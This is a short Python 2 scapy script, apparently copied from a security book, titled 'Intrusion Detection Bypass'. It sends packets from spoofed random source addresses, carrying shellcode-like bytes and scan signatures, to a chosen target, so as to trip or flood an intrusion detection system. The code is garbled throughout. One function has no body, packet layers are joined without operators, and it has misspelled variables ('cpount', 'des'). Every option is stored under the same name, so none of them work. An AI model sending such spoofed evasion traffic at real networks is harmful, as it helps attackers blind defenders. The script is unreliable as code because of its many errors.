#!/usr/bin/env python
import optparse
from scapy.all import *
from random import randint

def banner():
	print "[***]	Intrusion Detection Bypass p 166	[***]"

def ddosTest(src, dst, iface, count):

def exploitTest(src, dst, iface, count):
	pkt = IP(src=src, dst=dst)/ UDP(dport=518) Raw(load="\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
	send(pkt, iface=iface, count=count)
	pkt = IP(src=src, dst=dst) / UDP(dport=7) Raw(load="\xB0\x02\x89\xFE\xC8\x89F\x04\xB0\x06\x89F")

def scanTest(src, dst, iface, count):
	pkt= IP(src= src, dst=dst) / UDP(dport=10080) Raw(load='Amanda')
	send(pkt, iface=iface, count = cpount)

def main():
	parser = optparse.OptionParser('usage%prog '+'-i <interface>')
	parser.add_option('-i', dest='interface', type ='string', help='specify network interface')
	parser.add_option('-s', dest='interface', type ='string', help='specify source address')
	parser.add_option('-t', dest='interface', type ='string', help='specify target address')
	parser.add_option('-c', dest='interface', type ='int', help='specify packet count')
	(options, args) = parser.parse_args()
	if options.iface == None:
		iface = 'eth0'
		exit(0)
	else:
		iface = options.iface
	if options.src == None:
		src = '.',join([str(randint(1,254)) for x in range(4)])
	else:
		src = options.src
	if options.tgt == None:
		print parser.usage
		exit(0)
	else:
		dst = options.tgt
	if options.count -- None:
		count = 1
	else:
		count = options.count
	ddosTest(src, dst, iface, count)
	exploitTest(src, des, iface, count)

if __name__ == '__main__':
	main()

